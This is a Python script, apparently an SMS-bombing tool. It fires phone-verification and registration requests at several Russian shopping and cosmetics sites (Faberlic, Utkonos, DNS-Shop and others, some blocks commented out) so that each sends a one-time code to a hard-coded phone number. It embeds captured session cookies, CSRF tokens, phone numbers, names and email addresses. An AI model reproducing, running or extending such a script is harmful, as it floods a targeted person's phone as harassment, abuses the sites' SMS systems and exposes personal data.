import random, time, requests
#phone = '9637328400'
phone = '9815025526'
def ran():
    a = 'abcdefghijklmnopqrstuvwxyz'
    b = ''
    for i in range(11):
        b += random.choice(a)
    return b
def ran_ru():
    a = 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'
    b = ''
    for i in range(11):
        b += random.choice(a)
    return b





#███████╗ █████╗ ██████╗ ███████╗██████╗ ██╗     ██╗ ██████╗
#██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║     ██║██╔════╝
#█████╗  ███████║██████╔╝█████╗  ██████╔╝██║     ██║██║     
#██╔══╝  ██╔══██║██╔══██╗██╔══╝  ██╔══██╗██║     ██║██║     
#██║     ██║  ██║██████╔╝███████╗██║  ██║███████╗██║╚██████╗
#╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝


cookies = {
    '_ym_uid': '1730908229447814831',
    '_ym_d': '1730908229',
    'PHPSESSID': 'ef4218d6e47ef4bec72fc0c2553cc985',
    '_csrf': '6b707f9cf02518b53eff3cc1eeda3ea0c0bc17fdc969e0cfcb5a3cc7e1ae299ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Z5loc2DE-couJqsnd0br8eWnW25Ga6hO%22%3B%7D',
    '_ym_isad': '1',
    '_ym_visorc': 'b',
}

headers = {
    'accept': '*/*',
    'accept-language': 'ru,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ym_uid=1730908229447814831; _ym_d=1730908229; PHPSESSID=ef4218d6e47ef4bec72fc0c2553cc985; _csrf=6b707f9cf02518b53eff3cc1eeda3ea0c0bc17fdc969e0cfcb5a3cc7e1ae299ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Z5loc2DE-couJqsnd0br8eWnW25Ga6hO%22%3B%7D; _ym_isad=1; _ym_visorc=b',
    'origin': 'https://mavlivefaberlic.ru',
    'priority': 'u=1, i',
    'referer': 'https://mavlivefaberlic.ru/710389187?utm_source=yandexanvsestrani&utm_medium=cpc&utm_campaign=104301049&utm_content=15738500911&utm_term=%D0%A7%D0%B5%D1%80%D0%B5%D0%BF%D0%BE%D0%B2%D0%B5%D1%86&yclid=16151467680312852479',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
    'x-csrf-token': 'rdDum8NiAEimmxFwxlCx8m3La0ByxUjJfnr62jGLrvH35YL0oFBEDYv4fgWMIcKcCfsJMkqgH6cpSM-dUL3Gvg==',
    'x-requested-with': 'XMLHttpRequest',
}

data = f"_csrf=rdDum8NiAEimmxFwxlCx8m3La0ByxUjJfnr62jGLrvH35YL0oFBEDYv4fgWMIcKcCfsJMkqgH6cpSM-dUL3Gvg%3D%3D&action=sms&RegForm%5Buser_id%5D=710389187&RegForm%5Bbranch_id%5D=&RegForm%5Bset_id%5D=&RegForm%5Btype%5D=1&RegForm%5Bclient_id%5D=1730908229447814831&RegForm%5Butm_source%5D=yandexanvsestrani&RegForm%5Butm_medium%5D=cpc&RegForm%5Butm_content%5D=15738500911&RegForm%5Butm_term%5D=%D0%A7%D0%B5%D1%80%D0%B5%D0%BF%D0%BE%D0%B2%D0%B5%D1%86&RegForm%5Bsponsor_id%5D=710389187&RegForm%5Bsex%5D=f&RegForm%5Breturn_url%5D=https%3A%2F%2Ffaberlic.com&RegForm%5Bcountry_id%5D=1&RegForm%5Bsurname%5D=%D0%A1%D0%BC%D0%B8%D1%80%D0%BD%D0%BE%D0%B2&RegForm%5Bname%5D=%D0%9F%D0%B0%D0%B2%D0%B5%D0%BB&RegForm%5Bpatronymic%5D=%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D0%B5%D0%B2%D0%B8%D1%87&RegForm%5Bbirthday%5D=01.01.2001&RegForm%5Bemail%5D=iolipa777%40googlemail.com&RegForm%5Bphone%5D=%2B{ "7(" + phone[:3] + ")" + phone[3:5] + }&RegForm%5Bcode%5D="

response = requests.post('https://mavlivefaberlic.ru/regsend', cookies=cookies, headers=headers, data=data)
print(response.text)
print()
time.sleep(1)










##██████╗  ██████╗ ██╗     ██╗██╗  ██╗
##██╔══██╗██╔═══██╗██║     ██║██║ ██╔╝
##██████╔╝██║   ██║██║     ██║█████╔╝ 
##██╔══██╗██║   ██║██║     ██║██╔═██╗ 
##██║  ██║╚██████╔╝███████╗██║██║  ██╗
##╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝

'''
#Не работает
cookies = {
    'tmr_lvid': 'aca4f680554d63589862f17c0327e1f4',
    'tmr_lvidTS': '1691916022818',
    '_ym_uid': '1691916023238528987',
    '_ym_d': '1730908087',
    'roistat_first_visit': '5268351',
    '___dc': '682f8922-2b58-417a-9d60-0e572906b747',
    'PHPSESSID': 'c4869d0c2e5d64f98ce3ee0ea5248600',
    'u_key': '75f08f30-b1fa-4223-b1d8-581a906328fa',
    'cityId': '-202630360',
    'cityName': '%D0%90%D1%80%D0%BC%D1%8F%D0%BD%D1%81%D0%BA',
    '_ym_isad': '1',
    '_ym_visorc': 'w',
    'roistat_visit': '5509525',
    'roistat_visit_cookie_expire': '1209600',
    'roistat_is_need_listen_requests': '0',
    'roistat_is_save_data_in_cookie': '1',
    'domain_sid': '6wz8Q_YI8o-w5D7jMeJ7A%3A1736341597722',
    'tmr_detect': '1%7C1736341602515',
    'roistat_call_tracking': '0',
    'roistat_emailtracking_email': 'null',
    'roistat_emailtracking_tracking_email': 'null',
    'roistat_emailtracking_emails': 'null',
    'roistat_cookies_to_resave': 'roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_call_tracking%2Croistat_emailtracking_email%2Croistat_emailtracking_tracking_email%2Croistat_emailtracking_emails',
}

headers = {
    'accept': '*/*',
    'accept-language': 'ru,en;q=0.9',
    'content-type': 'application/json',
    # 'cookie': 'tmr_lvid=aca4f680554d63589862f17c0327e1f4; tmr_lvidTS=1691916022818; _ym_uid=1691916023238528987; _ym_d=1730908087; roistat_first_visit=5268351; ___dc=682f8922-2b58-417a-9d60-0e572906b747; PHPSESSID=c4869d0c2e5d64f98ce3ee0ea5248600; u_key=75f08f30-b1fa-4223-b1d8-581a906328fa; cityId=-202630360; cityName=%D0%90%D1%80%D0%BC%D1%8F%D0%BD%D1%81%D0%BA; _ym_isad=1; _ym_visorc=w; roistat_visit=5509525; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; domain_sid=6wz8Q_YI8o-w5D7jMeJ7A%3A1736341597722; tmr_detect=1%7C1736341602515; roistat_call_tracking=0; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_call_tracking%2Croistat_emailtracking_email%2Croistat_emailtracking_tracking_email%2Croistat_emailtracking_emails',
    'origin': 'https://armyansk.roliksushi.ru',
    'priority': 'u=1, i',
    'referer': 'https://armyansk.roliksushi.ru/',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
}

json_data = {
    'type': 'sendCode',
    'phone': '+7(963)732-84-00',
    'typeSend': 'sms',
}

response = requests.post(
    'https://armyansk.roliksushi.ru/actions/verifyphone.php',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
print(response)
print(response.text)
time.sleep(1)
'''




'''if phone == "9005469722":
    driver.get('https://alizaim.ru/')
    driver.find_element(By.XPATH, '/html/body/app-root/div/div[1]/div/app-header/div[1]/header/div/div[3]/span[2]').click()
    driver.find_element(By.XPATH, '//*[@id="loginModal"]/div/div/div/div[3]/div/div[1]/span').click()
    driver.find_element(By.XPATH, '//*[@id="loginModal"]/div/div/div/div[2]/form/div/div[2]/div[1]/input').send_keys(phone)
    driver.find_element(By.XPATH, '//*[@id="loginModal"]/div/div/div/div[2]/form/div/div[2]/div[2]/input').send_keys("Смирнов")
    driver.find_element(By.XPATH, '//*[@id="loginModal"]/div/div/div/div[2]/form/p/button').click()
time.sleep(1)'''





 ##██████╗ ██████╗ ██╗███████╗██╗      █████╗ ███╗   ███╗███████╗
##██╔═══██╗██╔══██╗██║██╔════╝██║     ██╔══██╗████╗ ████║██╔════╝
##██║   ██║██████╔╝██║█████╗  ██║     ███████║██╔████╔██║█████╗  
##██║   ██║██╔══██╗██║██╔══╝  ██║     ██╔══██║██║╚██╔╝██║██╔══╝  
##╚██████╔╝██║  ██║██║██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗
 ##╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝


'''
#Капча
headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ru,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://oriflama.ru',
    'Referer': 'https://oriflama.ru/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data = 'formservices%5B%5D=0eefbab99eca9f38d512cc342f78df51&formservices%5B%5D=3f702635428a1d5a4c884fb257a98dc9&tildaspec-formname=%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B0%D1%86%D0%B8%D1%8F+%D0%B1%D1%80%D0%B8%D1%82%D0%B0%D0%BD%D0%B8%D1%8F&Email=vwkotov%40yandex.ru&Name=Igor+Igor&tildaspec-phone-part%5B%5D-iso=%2B7&tildaspec-phone-part%5B%5D=(963)+732-84-00&Phone=%2B7+(963)+732-84-00&%D0%A1%D1%82%D1%80%D0%B0%D0%BD%D0%B0=%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F&form-spec-comments=&tildaspec-cookie=__ddg8_%3DAgqzGSaqVQfLBDCF%3B+__ddg9_%3D93.80.100.45%3B+__ddg10_%3D1736369749%3B+tildauid%3D1736369751452.744163%3B+tildasid%3D1736369751452.786477%3B+_ym_uid%3D1736369752300625997%3B+_ym_d%3D1736369752%3B+_ym_isad%3D1%3B+previousUrl%3Doriflama.ru%252Fdejstvuyushchij-katalog&tildaspec-referer=https%3A%2F%2Foriflama.ru%2Fdejstvuyushchij-katalog%3Fcore-1-utm%26yclid%3D1035378880375947263%23rec747475199&tildaspec-formid=form747475199&tildaspec-formskey=8b286215980ae72ab201d39f85547821&tildaspec-version-lib=02.001&tildaspec-pageid=31250232&tildaspec-projectid=5547821&tildaspec-lang=RU&tildaspec-fp=63547c646d387c686331327c6c72752c656e7c7057696e33327c76476f6f676c6520496e632e7c614d6f7a696c6c617c6e4e657473636170657c706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727c7072317c773136383068313035307c634432347c744f2d3138307c6d54307c'

response = requests.post('https://forms.tildaapi.com/procces/', headers=headers, data=data)
print(response.text)
time.sleep(1)
'''






#██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ███████╗
#██║   ██║╚══██╔══╝██║ ██╔╝██╔═══██╗████╗  ██║██╔═══██╗██╔════╝
#██║   ██║   ██║   █████╔╝ ██║   ██║██╔██╗ ██║██║   ██║███████╗
#██║   ██║   ██║   ██╔═██╗ ██║   ██║██║╚██╗██║██║   ██║╚════██║
#╚██████╔╝   ██║   ██║  ██╗╚██████╔╝██║ ╚████║╚██████╔╝███████║
 #╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝


cookies = {
    'qrator_jsr': '1736370740.924.vYABELfjg4yDeb5h-e4ive64f39ool0mebtdcglv3m89va7ou-00',
    'qrator_jsid': '1736370740.924.vYABELfjg4yDeb5h-jsf4oc0itu0qbjh3nb9rohql8h118c9k',
    'User_Agent': 'Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F130.0.0.0%20YaBrowser%2F24.12.0.0%20Safari%2F537.36',
    'Is_Search_Bot': 'false',
    'Utk_DvcGuid': '75042acd-6791-9b99-b3e4-3ecc122492ae',
    'SGM_0819': '55',
    'Utk_MrkGrpTkn': '6D768C72514EB134D59444ABBB06D854',
    'SOURCE_ID_time': '2025-01-09%2000%3A12%3A22',
    'Utk_SessionToken': '12FE138B90671CB57A16A384C54CCB7F',
    'App_Cache_LegalEntityId': '',
    'App_Cache_PassportId': '',
    'oxxfgh': 'ee078577-ebf1-4c1c-9acd-01a6da3b2cc1%230%235184000000%235000%231800000%2344965',
    'uwyii': '8ecf25a5-a862-7ee3-2ca9-f15ee89f7d7d',
    'rr-VisitorSegment-splitterGet': 'exp_badge_list_listing_Main%2Cexp_apigw_listing_Search',
    '_utm_referrer': 'https%3A//yandex.ru/',
    'Utk_SssTkn': '12FE138B90671CB57A16A384C54CCB7F',
    '_gcl_au': '1.1.1734616038.1736370742',
    '_ym_uid': '1736370742916585458',
    '_ym_d': '1736370742',
    'tmr_lvid': '6fe3a60512b57b6109b597fc2b94c330',
    'tmr_lvidTS': '1736370742445',
    '_ga_7T2BMDLJY8': 'GS1.1.1736370742.1.0.1736370742.0.0.0',
    '_ga_HBQ4X1YSD5': 'GS1.1.1736370742.1.0.1736370742.0.0.0',
    'spses.5612': '*',
    'tmr_detect': '1%7C1736370742730',
    'gnezdo_uid': '19447c2e4cb6c9a3741dba78',
    '_ga': 'GA1.2.133573335.1736370742',
    '_gid': 'GA1.2.1500541216.1736370743',
    '_gat_UA-327775-1': '1',
    '_ym_isad': '1',
    'iap.uid': '8851c9162fbf402f86e3c029247e691f',
    'flocktory-uuid': 'd67fb008-900b-4589-a1f5-9c480f831aa8-8',
    'domain_sid': 'SyqEDbEHDGA2p74Qlmucc%3A1736370743816',
    'spid.5612': 'c824f506-798b-4cd9-9417-9f55c53ab022.1736370743.2.1736370755.1736370743.193e3ed1-353c-49a1-a304-d836ae6c841c.a9e76207-fb9b-4b87-9123-7596e63bb569.bf6ee482-b6b4-4db3-9624-f20502dcc36b.1736370742691.17',
    '_ga_QB4J0GGLMG': 'GS1.1.1736370742.1.0.1736370755.0.0.1675159053',
    'uwyiert': '585b7160-00aa-f514-3646-341a73f13f29',
}

headers = {
    'Accept': 'application/json',
    'Accept-Language': 'ru,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'qrator_jsr=1736370740.924.vYABELfjg4yDeb5h-e4ive64f39ool0mebtdcglv3m89va7ou-00; qrator_jsid=1736370740.924.vYABELfjg4yDeb5h-jsf4oc0itu0qbjh3nb9rohql8h118c9k; User_Agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F130.0.0.0%20YaBrowser%2F24.12.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_DvcGuid=75042acd-6791-9b99-b3e4-3ecc122492ae; SGM_0819=55; Utk_MrkGrpTkn=6D768C72514EB134D59444ABBB06D854; SOURCE_ID_time=2025-01-09%2000%3A12%3A22; Utk_SessionToken=12FE138B90671CB57A16A384C54CCB7F; App_Cache_LegalEntityId=; App_Cache_PassportId=; oxxfgh=ee078577-ebf1-4c1c-9acd-01a6da3b2cc1%230%235184000000%235000%231800000%2344965; uwyii=8ecf25a5-a862-7ee3-2ca9-f15ee89f7d7d; rr-VisitorSegment-splitterGet=exp_badge_list_listing_Main%2Cexp_apigw_listing_Search; _utm_referrer=https%3A//yandex.ru/; Utk_SssTkn=12FE138B90671CB57A16A384C54CCB7F; _gcl_au=1.1.1734616038.1736370742; _ym_uid=1736370742916585458; _ym_d=1736370742; tmr_lvid=6fe3a60512b57b6109b597fc2b94c330; tmr_lvidTS=1736370742445; _ga_7T2BMDLJY8=GS1.1.1736370742.1.0.1736370742.0.0.0; _ga_HBQ4X1YSD5=GS1.1.1736370742.1.0.1736370742.0.0.0; spses.5612=*; tmr_detect=1%7C1736370742730; gnezdo_uid=19447c2e4cb6c9a3741dba78; _ga=GA1.2.133573335.1736370742; _gid=GA1.2.1500541216.1736370743; _gat_UA-327775-1=1; _ym_isad=1; iap.uid=8851c9162fbf402f86e3c029247e691f; flocktory-uuid=d67fb008-900b-4589-a1f5-9c480f831aa8-8; domain_sid=SyqEDbEHDGA2p74Qlmucc%3A1736370743816; spid.5612=c824f506-798b-4cd9-9417-9f55c53ab022.1736370743.2.1736370755.1736370743.193e3ed1-353c-49a1-a304-d836ae6c841c.a9e76207-fb9b-4b87-9123-7596e63bb569.bf6ee482-b6b4-4db3-9624-f20502dcc36b.1736370742691.17; _ga_QB4J0GGLMG=GS1.1.1736370742.1.0.1736370755.0.0.1675159053; uwyiert=585b7160-00aa-f514-3646-341a73f13f29',
    'DeviceID': '75042acd-6791-9b99-b3e4-3ecc122492ae',
    'Origin': 'https://www.utkonos.ru',
    'Referer': 'https://www.utkonos.ru/?ysclid=m5oeb1pgyl272716249&utm_referrer=https:%2F%2Fyandex.ru%2F',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'SessionToken': '12FE138B90671CB57A16A384C54CCB7F',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
    'X-Delivery-Mode': 'delivery',
    'X-Device-Brand': '',
    'X-Device-ID': '75042acd-6791-9b99-b3e4-3ecc122492ae',
    'X-Device-Name': '',
    'X-Device-OS': 'iOS',
    'X-Device-OS-Version': '12.4.8',
    'X-Domain': 'moscow',
    'X-Organization-Id': '',
    'X-Platform': 'omniweb',
    'X-Retail-Brand': 'utk',
    'baggage': 'sentry-environment=production,sentry-release=web-11.0.486,sentry-public_key=b99355c72549498d9e9075cc3d4006a2,sentry-trace_id=a690cf6215e8490e9351f1cb33d26cbe,sentry-sample_rate=1,sentry-transaction=%2F,sentry-sampled=true',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sentry-trace': 'a690cf6215e8490e9351f1cb33d26cbe-9504cee9741a0240-1',
    'traceparent': '00-bfbb10a2ae4e6d6c247baa0402949f25-e01bc0100e3509bf-01, 00-74d7288387a56a64425388058c1f68e6-c6c1f531e45b232f-01',
    'x-span-id': 'e01bc0100e3509bf',
    'x-trace-id': 'bfbb10a2ae4e6d6c247baa0402949f25',
}

json_data = {
    'phone': '79815025526',
    'acceptMarketingCommunications': True,
    'kfpVn': None,
    'kfpKsid': 'ee078577-ebf1-4c1c-9acd-01a6da3b2cc1',
}

response = requests.post('https://www.utkonos.ru/api-gateway/v1/auth/code/send', cookies=cookies, headers=headers, json=json_data)
print(response.text)
print()
time.sleep(1)





#██████╗ ███╗   ██╗███████╗
#██╔══██╗████╗  ██║██╔════╝
#██║  ██║██╔██╗ ██║███████╗
#██║  ██║██║╚██╗██║╚════██║
#██████╔╝██║ ╚████║███████║
#╚═════╝ ╚═╝  ╚═══╝╚══════╝

cookies = {
    '_ym_uid': '1685660585144093513',
    'tmr_lvid': '5865c261f7554598cf6f47bd8fc5e48a',
    'tmr_lvidTS': '1685660585232',
    'rrpvid': '464291404655890',
    'rcuid': '6478dd3d7016a2f896fe0635',
    'adrcid': 'An3GTK62igYXaulVh4jO1DQ',
    'phonesIdentV2': '69408bde-78c0-480d-9464-00d28548210b',
    'date-user-last-order-v2': '8a0959c6170daf8712c77f5448afa3aba2062a69aefbbad68eb530f68cf8dba2a%3A2%3A%7Bi%3A0%3Bs%3A23%3A%22date-user-last-order-v2%22%3Bi%3A1%3Bi%3A-36000%3B%7D',
    '_ga': 'GA1.1.1848926120.1685660585',
    'current_path': '605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D',
    '_ym_d': '1725983169',
    '_ymab_param': '9chThGplhsxn222fR5yTysOjkWZCX2gUvWKgrYVcHvMuBrBMs_H3GQSfPWSStvPTFHrnwoJRAJCZzmvNjCtda2aHrGo',
    'ab_spa': '%7B%22home-delivery-test%22%3A%22main_post_delivery_1%22%7D',
    '_ab_': '%7B%22card-top%22%3A%22reviews_3%22%7D',
    'qrator_ssid': '1736609207.675.RcjGtUcxYrbvNDYw-vcvlql491eaavcc8brvj49c7k1fookfc',
    'lang': 'ru',
    'city_path': 'moscow',
    '_csrf': '9dae167e66eeb3041cccd0db3aa344e3b44af6a1d5c11aaf19941f07ed9c545ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22nIQYY1RRKVwyZPg_ezMDRIMSGB_ievNm%22%3B%7D',
    '_ym_isad': '1',
    '_ym_visorc': 'b',
    'last-cart-update': '1',
    'domain_sid': 'KZRfPOQ63QzgxDvGWH0HS%3A1736609209756',
    'PHPSESSID': '0d713bc1c6817a8009aaffa2bb118572',
    'cartUserCookieIdent_v3': '2c493039d6a428f60596e547cdeaba00b951dfd07f3756bc74e7d7909f3ecbcba%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%22ba86fae9-38ea-3e72-83a2-dce7a42995bb%22%3B%7D',
    'tmr_detect': '1%7C1736609445381',
    'dnsauth_csrf': '664d60efd65054dbc8bd49e59489553a8f1bbf53e07db9e64e6966061e41af2ca%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%22f7ad4414-d6ec-46e1-9e8c-e0dde679411d%22%3B%7D',
    '_ga_FLS4JETDHW': 'GS1.1.1736609208.60.1.1736609480.11.0.440527090',
    'qrator_jsid': '1736609207.262.Ijh4mM4zcoTNcK8a-7u0dvnaorcksk6a5bslqk2ml6t4ue7hf',
}

headers = {
    'accept': '*/*',
    'accept-language': 'ru,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLxjyuV7dWhCjQZF',
    # 'cookie': '_ym_uid=1685660585144093513; tmr_lvid=5865c261f7554598cf6f47bd8fc5e48a; tmr_lvidTS=1685660585232; rrpvid=464291404655890; rcuid=6478dd3d7016a2f896fe0635; adrcid=An3GTK62igYXaulVh4jO1DQ; phonesIdentV2=69408bde-78c0-480d-9464-00d28548210b; date-user-last-order-v2=8a0959c6170daf8712c77f5448afa3aba2062a69aefbbad68eb530f68cf8dba2a%3A2%3A%7Bi%3A0%3Bs%3A23%3A%22date-user-last-order-v2%22%3Bi%3A1%3Bi%3A-36000%3B%7D; _ga=GA1.1.1848926120.1685660585; current_path=605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D; _ym_d=1725983169; _ymab_param=9chThGplhsxn222fR5yTysOjkWZCX2gUvWKgrYVcHvMuBrBMs_H3GQSfPWSStvPTFHrnwoJRAJCZzmvNjCtda2aHrGo; ab_spa=%7B%22home-delivery-test%22%3A%22main_post_delivery_1%22%7D; _ab_=%7B%22card-top%22%3A%22reviews_3%22%7D; qrator_ssid=1736609207.675.RcjGtUcxYrbvNDYw-vcvlql491eaavcc8brvj49c7k1fookfc; lang=ru; city_path=moscow; _csrf=9dae167e66eeb3041cccd0db3aa344e3b44af6a1d5c11aaf19941f07ed9c545ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22nIQYY1RRKVwyZPg_ezMDRIMSGB_ievNm%22%3B%7D; _ym_isad=1; _ym_visorc=b; last-cart-update=1; domain_sid=KZRfPOQ63QzgxDvGWH0HS%3A1736609209756; PHPSESSID=0d713bc1c6817a8009aaffa2bb118572; cartUserCookieIdent_v3=2c493039d6a428f60596e547cdeaba00b951dfd07f3756bc74e7d7909f3ecbcba%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%22ba86fae9-38ea-3e72-83a2-dce7a42995bb%22%3B%7D; tmr_detect=1%7C1736609445381; dnsauth_csrf=664d60efd65054dbc8bd49e59489553a8f1bbf53e07db9e64e6966061e41af2ca%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%22f7ad4414-d6ec-46e1-9e8c-e0dde679411d%22%3B%7D; _ga_FLS4JETDHW=GS1.1.1736609208.60.1.1736609480.11.0.440527090; qrator_jsid=1736609207.262.Ijh4mM4zcoTNcK8a-7u0dvnaorcksk6a5bslqk2ml6t4ue7hf',
    'origin': 'https://www.dns-shop.ru',
    'priority': 'u=1, i',
    'referer': 'https://www.dns-shop.ru/no-referrer',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
    'x-csrf-token': 'S1-8G-tdyzZHy3_FYxi1RCP9f1AdRrbc49Ronin2mWA4Ns9SgTuxRSmlRrAQadAgQIhKAU4jwp2LrFGqZ5-sIw==',
    'x-requested-with': 'XMLHttpRequest',
}

files = {
    'FastAuthorizationLoginLoadForm[login]': (None, '79637328400'),
    'FastAuthorizationLoginLoadForm[token]': (None, ''),
    'FastAuthorizationLoginLoadForm[isPhoneCall]': (None, '0'),
}

response = requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/', cookies=cookies, headers=headers, files=files)
print(response.text)
print()
time.sleep(1)